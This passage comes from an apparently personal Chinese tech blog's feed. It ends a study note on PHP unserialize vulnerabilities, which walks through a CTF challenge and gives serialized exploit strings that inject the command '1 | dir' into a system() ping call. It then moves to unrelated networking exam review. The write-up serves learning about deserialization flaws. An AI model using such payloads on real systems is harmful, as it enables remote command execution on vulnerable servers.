fopen(&quot;shell.php&quot;,&quot;w&quot;);</span><br><span class="line">        fwrite($fp,$name);</span><br><span class="line">        fclose($fp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//$username = &apos;O:16:&quot;Object_serialize&quot;:1:&#123;s:4:&quot;name&quot;;s:4:&quot;Jnny&quot;;&#125;&apos;;</span><br><span class="line">$username = $_GET[&apos;username&apos;];</span><br><span class="line">print_r($username);</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">$b = unserialize($username);</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;.&quot;--------------------------------------&quot;.&quot;&lt;/br&gt;&quot;;</span><br><span class="line">require &quot;getshell.php&quot;;</span><br></pre></td></tr></table></figure><p>通过<code>username</code>传入构造好的序列化字符串后，进行反序列化时自动调用 <code>__wakeup()</code>函数，从而在<code>Object_serialize</code>会自动调用对象<code>test</code>的类<code>Object_Example</code>中的<code>__construct()</code>方法，从而写入到东西到文件中。</p><h3 id="炭烤栗子"><a href="#炭烤栗子" class="headerlink" title="炭烤栗子"></a>炭烤栗子</h3><p>某次比赛<code>test.php</code>源码（<code>2018fj</code>）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> $method;</span><br><span class="line">    <span class="keyword">private</span> $args;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method, $args)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">"ping"</span>))) &#123;</span><br><span class="line">            call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ping</span><span class="params">($host)</span></span>&#123;</span><br><span class="line">        system(<span class="string">"ping -c 2 $host"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">        $str=str_replace(<span class="string">' '</span>,<span class="string">''</span>,$str);</span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;args[$k] = <span class="keyword">$this</span>-&gt;waf(trim(mysql_escape_string($v)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line">$a=@$_POST[<span class="string">'a'</span>];</span><br><span class="line">@unserialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看看上面的代码，首先执行就两句话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a=@$_POST[&apos;a&apos;];</span><br><span class="line">@unserialize($a);</span><br></pre></td></tr></table></figure><p>传入<code>post</code>的数据，然后反序列化该值。我们知道，<code>unserialize()</code>函数执行后，会自动执行<code>__wakeup()</code>预备执行对象的资源，进行初始化。而当<code>__wakeup()</code>函数执行完后，会调用析构函数<code>__destruct()</code>释放资源，仔细观察 <code>__wakeup()</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function __wakeup()&#123;</span><br><span class="line">        foreach($this-&gt;args as $k =&gt; $v) &#123;</span><br><span class="line">            $this-&gt;args[$k] = $this-&gt;waf(trim(mysql_escape_string($v)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>发现反序列化的值会被其中<code>waf</code>()进行空格过滤，如下图</p><p><img src="/2019/03/20/serialize与unserialize/1553070235661.png" alt="1553070235661"></p><p>再接着调用了<code>__destruct()</code>，方便观察我把每个函数执行的过程呈现出来</p><p><img src="/2019/03/20/serialize与unserialize/1553070491839.png" alt="1553070491839"></p><p>其中语句<code>call_user_func_array(array($this, $this-&gt;method), $this-&gt;args);</code>，指的是回调当前类<code>$this</code>的<code>$this-&gt;method</code>方法，<code>$this-&gt;args</code>为传入的<code>$this-&gt;method</code>方法的参数值。在本题中就是往<code>test</code>类的<code>ping()</code>中传入了一个<code>$host</code>为类变量<code>$args</code>的值，随后通过构造好的反序列化的字符串，我们拿到了想要的东西。</p><p><img src="/2019/03/20/serialize与unserialize/1553070745585.png" alt="1553070745585"></p><p><code>exp:a=O:4:&quot;home&quot;:2:{s:12:&quot;%00home%00method&quot;;s:4:&quot;ping&quot;;s:10:&quot;%00home%00args&quot;;a:1:{i:0;s:7:&quot;1 | dir&quot;;}}</code></p><p>至于其中为啥跟我们之前将的不一样，构造时，我们加入了在私有成员变量<code>method</code>前加了个<code>%00home%00</code>，这是因为当成员变量是私有的时候，会在成员变量前面添加类名；当成员变量是被保护的时候，会在被保护成员前面添加一个<code>*</code>，并且，在所添加的类名或者<code>*</code>的左右两边都会有一个<code>null</code>字节，也就是<code>%00</code>，因此，长度都增加了<code>2</code>。下面给出不一样的代码，请大伙自行尝试构造<code>exp</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class test&#123;</span><br><span class="line">    </span><br><span class="line">    protected $method;</span><br><span class="line">    private $args;</span><br><span class="line">    function __construct($method, $args) &#123;</span><br><span class="line">        </span><br><span class="line">      </span><br><span class="line">        $this-&gt;method = $method;</span><br><span class="line">        $this-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if (in_array($this-&gt;method, array(&quot;ping&quot;))) &#123;</span><br><span class="line">            call_user_func_array(array($this, $this-&gt;method), $this-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    function ping($host)&#123;</span><br><span class="line">        system(&quot;ping -c 2 $host&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    function waf($str)&#123;</span><br><span class="line">        $str=str_replace(&apos; &apos;,&apos;&apos;,$str);</span><br><span class="line">        return $str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        foreach($this-&gt;args as $k =&gt; $v) &#123;</span><br><span class="line">            $this-&gt;args[$k] = $this-&gt;waf(trim(mysql_escape_string($v)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line">$a=@$_POST[&apos;a&apos;];</span><br><span class="line">@unserialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><code>exp:a=O:4:&quot;home&quot;:2:{s:9:&quot;%00*%00method&quot;;s:4:&quot;ping&quot;;s:10:&quot;%00home%00args&quot;;a:1:{i:0;s:7:&quot;1 | dir&quot;;}}</code></p><p>关于序列化的问题，发现并不是很难，只要代码看的懂，执行步骤明白，知道漏洞的原理，没有想象的那么难，这篇还没完，持续更新，关于反序列化这只是冰山一角。青山不改，绿水长流。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;相对于网上其他关于Serialize的讲解，不下万篇，学习笔记，稍微总结一番。本篇文章按照&lt;a href=&quot;https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;浅谈php反序列化漏洞&lt;/a&gt;，进行学习指导，基础内容略过。&lt;/p&gt;
    
    </summary>
    
    
      <category term="php" scheme="https://jianghuxia.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>计算机网络期末复习</title>
    <link href="https://jianghuxia.github.io/2019/01/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/"/>
    <id>https://jianghuxia.github.io/2019/01/09/计算机网络期末复习/</id>
    <published>2019-01-09T12:36:07.000Z</published>
    <updated>2019-01-13T14:45:39.328Z</updated>
    
    <content type="html"><![CDATA[<p>期末复习，一起愉快地复习吧！</p><p><strong>2019-01-13 基本更新完毕，如有补充，私聊哦~</strong></p><a id="more"></a><h2 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h2><p>WAN、MAN、LAN、PAN、WPAN、AN、WLAN、ISP、NAP、IXP、OSI/RM、DNS、HTTP、FTP、SMTP、ICMP、IGMP、DHCP、PDU、SAP、SDU、QAM、ADSL、HFC、PPP、LCP、NCP、CRC、FCS、HDLC、CSMA/CD、DIX Ethernet V2、IEEE802.3、STP、IP、ARP、IGP、RIP、OSPF、EGP、BGP、VPN、NAT、API</p><p>OSPF（Open Shortest Pass First,开放最短路径优先协议）</p><p>FDM(frequency division multiplexing) 频分复用</p><p>TDM(Time Division Multiplexing) 时分多路复用</p><p>STDM(Statistic Time Division Multiplexing)统计时分复用</p><p>WDM(Wave Division Multiplexing) 波分复用</p><p>DWDM(Dense Wave Division Multiplexing) 密集波分复用</p><p>CDMA(Code Wave Division Multiplexing)码分多址</p><h2 id="大题"><a href="#大题" class="headerlink" title="大题"></a>大题</h2><h3 id="P39-1-17"><a href="#P39-1-17" class="headerlink" title="P39-1-17"></a><code>P39-1-17</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">收发两端之间的传输距离为1000km，信号在媒体上的传播速率为2×108m/s。试计算以下两种情况的发送时延和传播时延： （1） 数据长度为107bit,数据发送速率为100kb/s。 （2） 数据长度为103bit,数据发送速率为1Gb/s。 从上面的计算中可以得到什么样的结论？</span><br></pre></td></tr></table></figure><p>解：</p><p>（1）发送时延：ts=107/105=100s 传播时延tp=106/(2×108)=0.005s </p><p>（2）发送时延ts =103/109=1µs 传播时延：tp=106/(2×108)=0.005s </p><p>结论：若数据长度大而发送速率低，则在总的时延中，发送时延往往大于传播时延。但若数据长度短而发送速率高，则传播时延就可能是总时延中的主要成分。</p><h3 id="P39-1-19"><a href="#P39-1-19" class="headerlink" title="P39-1-19"></a><code>P39-1-19</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">长度为100字节的应用层数据交给传输层传送，需加上20字节的TCP首部。再交给网络层传送，需加上20字节的IP首部。最后交给数据链路层的以太网传送，加上首部和尾部工18字节。试求数据的传输效率。数据的传输效率是指发送的应用层数据除以所发送的总数据（即应用数据加上各种首部和尾部 的额外开销）。若应用层数据长度为1000字节，数据的传输效率是多少？</span><br></pre></td></tr></table></figure><p>解：</p><p>（1）100/（100+20+20+18）=63.3% </p><p>（2）1000/（1000+20+20+18）=94.5%</p><h3 id="P39-1-28"><a href="#P39-1-28" class="headerlink" title="P39-1-28"></a><code>P39-1-28</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">28、假定要在网络上传送1.5MB的文件。设分组长度为1KB，往返时间RTT=80ms。传送数据之前还需要有建立TCP连接的时间，这时间是2×RTT=160ms。试计算在以下几种情况下接收方收完该文件的最后一个比特所需的时间。</span><br><span class="line"></span><br><span class="line">（1）数据发送速率为10Mb/s，数据分组可以连续发送。</span><br><span class="line"></span><br><span class="line">（2）数据发送速率为10Mb/s，但每发送完一个分组后要等待一个RTT时间才能再发送一个分组。</span><br><span class="line"></span><br><span class="line">（3）数据发送速率极快，可以不考虑发送数据所需的时间。但规定在每一个RTT往返时间内只能发送20个分组。</span><br><span class="line"></span><br><span class="line">（4）数据发送速率极快，可以不考虑发送数据所需的时间。但在第一个RTT往返时间内只能发送一个分组，在第二个RTT内可发送两个分组，在第三个RTT内可发送四个分组（即23-1=22=4个分组）</span><br></pre></td></tr></table></figure><p><img src="/2019/01/09/计算机网络期末复习/1547383428085.png" alt="1547383428085"></p><h3 id="P67-2-07"><a href="#P67-2-07" class="headerlink" title="P67-2-07"></a><code>P67-2-07</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">假定某信道受奈氏准则限制的最高码元速率为80000码元/秒.如果采用振幅调制,把码元的振幅划分为16个不同等级来传送,那么可以获得多高的数据率（b/s）?</span><br></pre></td></tr></table></figure><p>参考如下：</p><p><img src="/2019/01/09/计算机网络期末复习/1547025647017.png" alt="1547025647017"></p><h3 id="P67-2-13"><a href="#P67-2-13" class="headerlink" title="P67-2-13"></a><code>P67-2-13</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">为什么要使用信道复用技术？常用的信道复用技术有哪些？</span><br></pre></td></tr></table></figure><p> 答：</p><p>为了通过共享信道、最大限度提高信道利用率。</p><p>常用的信道复用技术有：频分复用、时分复用、统计时分复用、波分复用、码分复用等</p><h3 id="P68-2-16"><a href="#P68-2-16" class="headerlink" title="P68-2-16"></a><code>P68-2-16</code></h3><p><img src="/2019/01/09/计算机网络期末复习/1547032544337.png" alt="1547032544337"></p><p>解：</p><p>S·A=（＋1－1＋3＋1－1＋3＋1＋1）／8=1， A发送1 </p><p>S·B=（＋1－1－3－1－1－3＋1－1）／8=-1， B发送0 </p><p>S·C=（＋1＋1＋3＋1－1－3－1－1）／8=0， C无发送 </p><p>S·D=（＋1＋1＋3－1＋1＋3＋1－1）／8=1， D发送1</p><p>除此之外，有类似考法如下：</p><p>第一种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A：0 0 0 1 1 0 1 1</span><br><span class="line">B：0 0 1 0 1 1 1 0</span><br><span class="line">C：0 1 0 1 1 1 0 0</span><br><span class="line">D：0 1 0 0 0 0 1 0</span><br><span class="line">当站点A发送比特1，站点B发送比特0，站点C发送比特1，站点D什么数据也不发送时，总的发送信号是什么？</span><br></pre></td></tr></table></figure><p>解题思路：先将0–&gt;-1，1–&gt;1；再判断是否需要转化该码片序列的二进制反码。若发送比特 0，则发送该码片序列的二进制反码；最后将A、B、C、D竖列相加，即可求出总的发送信号。</p><p>第二种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">当总的信号是（-1 +1 -3 +3 +1 -1 -1 +1）时，且各站点码片序列为</span><br><span class="line">A：0 0 0 1 1 0 1 1</span><br><span class="line">B：0 0 1 0 1 1 1 0</span><br><span class="line">C：0 1 0 1 1 1 0 0</span><br><span class="line">D：0 1 0 0 0 0 1 0</span><br><span class="line">站点A、B、C发送信号是什么？</span><br></pre></td></tr></table></figure><p>解题思路：先将<code>0--&gt;-1</code>，<code>1--&gt;1</code>；然后……</p><h3 id="P109-3-07"><a href="#P109-3-07" class="headerlink" title="P109-3-07"></a><code>P109-3-07</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">要发送的数据为1101011011。采用CRC的生成多项式是P（X）=X4+X+1。试求应添加在数据后面的余数。数据在传输过程中最后一个1变成了0，问接收端能否发现？若数据在传输过程中最后两个1都变成了0，问接收端能否发现？采用CRC检验后，数据链路层的传输是否就变成了可靠的传输？</span><br></pre></td></tr></table></figure><p>答：作二进制除法，11010110110000 % 10011 得余数1110 ，添加的检验序列是1110. 作二进制除法，两种错误均可发现，仅仅采用了CRC检验，缺重传机制，数据链路层的传输还不是可靠的传输。<strong>（因为P求出来为10011，一共五位，被除数后面补四个零。）</strong></p><h3 id="P110-3-08"><a href="#P110-3-08" class="headerlink" title="P110-3-08"></a><code>P110-3-08</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">要发送的数据为101110。采用CRCD 生成多项式是P（X）=X3+1。试求应添加在数据后面的余数。</span><br></pre></td></tr></table></figure><p>答：作二进制除法，101110 000 % 1001 添加在数据后面的余数是011。</p><h3 id="P110-3-10"><a href="#P110-3-10" class="headerlink" title="P110-3-10"></a><code>P110-3-10</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">试说明10BASE-T中的“10”、“BASE”和“T”所代表的意思。</span><br></pre></td></tr></table></figure><p>答：10BASE-T中的“10”表示信号在电缆上的传输速率为10MB/s，“BASE”表示电缆上 的信号是基带信号，“T”代表双绞线星形网，但10BASE-T的通信距离稍短，每个站到 集线器的距离不超过100m。</p><h3 id="P110-3-18"><a href="#P110-3-18" class="headerlink" title="P110-3-18"></a><code>P110-3-18</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">PPP协议使用同步传输技术传送比特串0110111111111100。试问经过零比特填充后变成怎样的比特串？若接收端收到的PPP帧的数据部分是0001110111110111110110，问删除发送端加入的零比特后变成怎样的比特串。</span><br></pre></td></tr></table></figure><p>此题只需记住零比特填充只需”遇到五个1后面补一个0”，故第一小问答案为<code>0110 111110 111110 00</code>。反之，通过原理反推出第二小问的答案<code>000111011111 11111 110</code></p><h3 id="P110-3-20"><a href="#P110-3-20" class="headerlink" title="P110-3-20"></a><code>P110-3-20</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">假定1KM长的CSMA/CD协议网络的数据率为1Gb/s。设信号在网络上的传播速率为200000KM/S。求能够使用此协议的最短帧长。</span><br></pre></td></tr></table></figure><p>解题：</p><p>对于 <code>1km</code> 电缆，单程传播时间为<code>1KM÷200000KM/s=5us</code>，来回路程传播时间为<code>10us</code>。为了能够按照<a href="https://baike.baidu.com/item/CSMA%2FCD" target="_blank" rel="noopener"><strong>CSMA/CD</strong></a>工作，最小帧的发射时间不能小于<code>10us</code>。以<code>1Gbit/s</code>速率工作，<code>10us</code>可以发送的比特数等于：<code>(10*10^-6)s*(1*10^9)bit/s=10000bit</code>，因此，最短帧是<code>10000</code> 位或 <code>1250</code> 字节长。  </p><p>注意：<code>1s=1000000us</code>、<code>1Mbit/s=10^6bit/s</code>、<code>1Gbit/s=1*10^3Mbit/s=1*10^9bit/s</code>、<code>比特数（时延带宽积）=传播时延*带宽</code>。</p><h3 id="P111-3-27"><a href="#P111-3-27" class="headerlink" title="P111-3-27"></a><code>P111-3-27</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">有10个站连接到以太网上，试计算以下三种情况下每一个站所能得到带宽。 </span><br><span class="line">（1）10 个站点连接到一个 10Mbit/s 以太网集线器； </span><br><span class="line">（2）10 站点连接到一个 100Mbit/s 以太网集线器； </span><br><span class="line">（3）10 个站点连接到一个 10Mbit/s 以太网交换机。</span><br></pre></td></tr></table></figure><p>此题只需记住以太网交换机的主要特点： </p><p> 1.以太网交换机的每个端口都直接与主机相连，并且一般都工作在全双工方式。 </p><p> 2.交换机能同时连通许多对的端口，使每一对相互<a href="http://baike.sogou.com/lemma/ShowInnerLink.htm?lemmaId=58051" target="_blank" rel="noopener">通信</a>的主机都能像独占通信媒体那样，进行无冲突地传输数据。 </p><p> 3.共享 <a href="http://baike.sogou.com/lemma/ShowInnerLink.htm?lemmaId=8190205" target="_blank" rel="noopener">传输媒体</a>的带宽，对于普通 10 Mb/s 的<a href="http://baike.sogou.com/lemma/ShowInnerLink.htm?lemmaId=8649406" target="_blank" rel="noopener">共享式以太网</a> ，若共有 N 个用户，则每个用户占有的平均带宽只有总带宽(10 Mb/s)的 N 分之一。</p><p>答：</p><p>（1）10 个站共享 10Mbit/s，每个站1Mbit/s。</p><p>（2）10 个站共享 100Mbit/s，每个站10Mbit/s。</p><p>（3）每一个站独占 10Mbit/s。</p><h3 id="P111-3-33"><a href="#P111-3-33" class="headerlink" title="P111-3-33"></a><code>P111-3-33</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">以太网交换机有6个接口,分别接到5台主机和一个路由器,在下面表的动作一栏中,表示先后发送了4个帧.</span><br><span class="line">假定在开始时,以太网交换机的交换表是空的.试把该表中其他的栏目都填写完。如图:</span><br></pre></td></tr></table></figure><p><img src="/2019/01/09/计算机网络期末复习/1547039690071.png" alt="1547039690071"></p><p>网上一<a href="http://tieba.baidu.com/p/5107962548?traceid=#106960942164l" target="_blank" rel="noopener">大牛的解题过程</a>，如下</p><p><img src="/2019/01/09/计算机网络期末复习/1547039548223.png" alt="1547039548223"></p><h3 id="P197-4-19"><a href="#P197-4-19" class="headerlink" title="P197-4-19"></a><code>P197-4-19</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">主机A发送IP数据报给主机B,途中经过了5个路由器。试问在IP数据报的发送过程总共使用几次ARP?</span><br></pre></td></tr></table></figure><p>（前提，理论上，当前主机<a href="https://www.baidu.com/s?wd=%E8%B7%AF%E7%94%B1%E5%99%A8&amp;tn=SE_PcZhidaonwhc_ngpagmjz&amp;rsv_dl=gh_pc_zhidao" target="_blank" rel="noopener">路由器</a>arp表中都没有<a href="https://www.baidu.com/s?wd=%E4%B8%8B%E4%B8%80%E8%B7%B3&amp;tn=SE_PcZhidaonwhc_ngpagmjz&amp;rsv_dl=gh_pc_zhidao" target="_blank" rel="noopener">下一跳</a><a href="https://www.baidu.com/s?wd=%E8%B7%AF%E7%94%B1%E5%99%A8&amp;tn=SE_PcZhidaonwhc_ngpagmjz&amp;rsv_dl=gh_pc_zhidao" target="_blank" rel="noopener">路由器</a><a href="https://www.baidu.com/s?wd=MAC&amp;tn=SE_PcZhidaonwhc_ngpagmjz&amp;rsv_dl=gh_pc_zhidao" target="_blank" rel="noopener">MAC</a>）<br>共需6次，主机A先通过arp得到第一个<a href="https://www.baidu.com/s?wd=%E8%B7%AF%E7%94%B1%E5%99%A8&amp;tn=SE_PcZhidaonwhc_ngpagmjz&amp;rsv_dl=gh_pc_zhidao" target="_blank" rel="noopener">路由器</a>的<a href="https://www.baidu.com/s?wd=MAC&amp;tn=SE_PcZhidaonwhc_ngpagmjz&amp;rsv_dl=gh_pc_zhidao" target="_blank" rel="noopener">MAC</a>，之后每一个路由器转发前都通过ARP得到<a href="https://www.baidu.com/s?wd=%E4%B8%8B%E4%B8%80%E8%B7%B3&amp;tn=SE_PcZhidaonwhc_ngpagmjz&amp;rsv_dl=gh_pc_zhidao" target="_blank" rel="noopener">下一跳</a>路由器的<a href="https://www.baidu.com/s?wd=MAC&amp;tn=SE_PcZhidaonwhc_ngpagmjz&amp;rsv_dl=gh_pc_zhidao" target="_blank" rel="noopener">MAC</a>，最后一条路由器将<a href="https://www.baidu.com/s?wd=IP&amp;tn=SE_PcZhidaonwhc_ngpagmjz&amp;rsv_dl=gh_pc_zhidao" target="_blank" rel="noopener">IP</a>包发给B前仍要通过ARP得到B的MAC，共6次。</p><h3 id="P197-4-20"><a href="#P197-4-20" class="headerlink" title="P197-4-20"></a><code>P197-4-20</code></h3><p>（1）分组的目的站IP地址为：128.96.39.10。先与子网掩码255.255.255.128相与，得128.96.39.0，可见该分组经接口0转发。 </p><p>（2）分组的目的IP地址为：128.96.40.12。 ① 与子网掩码255.255.255.128相与得128.96.40.0，不等于128.96.39.0。 ② 与子网掩码255.255.255.128相与得128.96.40.0，经查路由表可知，该项分组经R2转发。</p><p> （3）分组的目的IP地址为：128.96.40.151，与子网掩码255.255.255.128相与后得128.96.40.128，与子网掩码255.255.255.192相与后得128.96.40.128，经查路由表知，该分组转发选择默认路由，经R4转发。 </p><p>（4）分组的目的IP地址为：192.4.153.17。与子网掩码255.255.255.128相与后得192.4.153.0。与子网掩码255.255.255.192相与后得192.4.153.0，经查路由表知，该分组经R3转发。 </p><p>（5）分组的目的IP地址为：192.4.153.90，与子网掩码255.255.255.128相与后得192.4.153.0。与子网掩码255.255.255.192相与后得192.4.153.64，经查路由表知，该分组转发选择默认路由，经R4转发。</p><h3 id="P197-4-22"><a href="#P197-4-22" class="headerlink" title="P197-4-22"></a><code>P197-4-22</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一个数据报长度为4000字节(固定首部长度,长度为20字节).现在经过一个网络传送,网络能传送的最大数据长度为1500字节.试问应当划分成几个短些的数据报片?各数据报片的数据字段长度,片偏移字段和MF标志应为何值.</span><br></pre></td></tr></table></figure><p><img src="/2019/01/09/计算机网络期末复习/1547386988391.png" alt="1547386988391"></p><h3 id="P197-4-26"><a href="#P197-4-26" class="headerlink" title="P197-4-26"></a><code>P197-4-26</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有如下的4个/24地址块，试进行最大可能的聚合。212.56.132.0/24，212.56.133.0/24，212.56.134.0/24，212.56.135.0/24。</span><br></pre></td></tr></table></figure><p><img src="/2019/01/09/计算机网络期末复习/1547387643580.png" alt="1547387643580"></p><h3 id="P198-4-28"><a href="#P198-4-28" class="headerlink" title="P198-4-28"></a><code>P198-4-28</code></h3><p><img src="/2019/01/09/计算机网络期末复习/1547387849884.png" alt="1547387849884"></p><h3 id="P198-4-29"><a href="#P198-4-29" class="headerlink" title="P198-4-29"></a><code>P198-4-29</code></h3><p><img src="/2019/01/09/计算机网络期末复习/1547045867057.png" alt="1547045867057"></p><p><img src="/2019/01/09/计算机网络期末复习/1547045821425.png" alt="1547045821425"></p><h3 id="P199-4-41"><a href="#P199-4-41" class="headerlink" title="P199-4-41"></a><code>P199-4-41</code></h3><p>课本后有答案，记住规则：</p><p>更新算法，收到的报文距离+1<br>如果有新网络，更新，下一跳指向更新源<br>如果已有网络收到更小的距离，更新，下一跳指向更新源<br>如果已有网络收到更大距离，且原有下一跳不是更新源，则不更新<br>如果已有网络收到更大距离，且原有下一跳是更新源，则更新</p><h3 id="P199-4-42"><a href="#P199-4-42" class="headerlink" title="P199-4-42"></a><code>P199-4-42</code></h3><p>课本后有答案，记住规则：</p><p>更新算法，收到的报文距离+1<br>如果有新网络，更新，下一跳指向更新源<br>如果已有网络收到更小的距离，更新，下一跳指向更新源<br>如果已有网络收到更大距离，且原有下一跳不是更新源，则不更新<br>如果已有网络收到更大距离，且原有下一跳是更新源，则更新</p><h3 id="P200-4-55"><a href="#P200-4-55" class="headerlink" title="P200-4-55"></a><code>P200-4-55</code></h3><p><img 